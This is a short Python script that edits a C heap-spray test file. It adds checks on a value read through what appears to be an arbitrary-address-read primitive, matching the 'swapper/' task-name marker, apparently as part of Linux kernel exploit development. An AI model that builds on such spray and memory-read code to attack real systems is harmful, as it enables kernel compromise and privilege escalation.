with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

old_code = """        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino == 0x2f72657070617773) {"""

new_code = """        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino != 0 && f_ino != 3 && f_ino != 0x2f72657070617773 && f_ino != 0x0072657070617773) {
            printf("[!] f_ino changed to %llx in round %d iter %d!\\n", f_ino, r, i);
        }
        if (f_ino == 0x2f72657070617773 || f_ino == 0x0072657070617773) {"""

text = text.replace(old_code, new_code)
with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
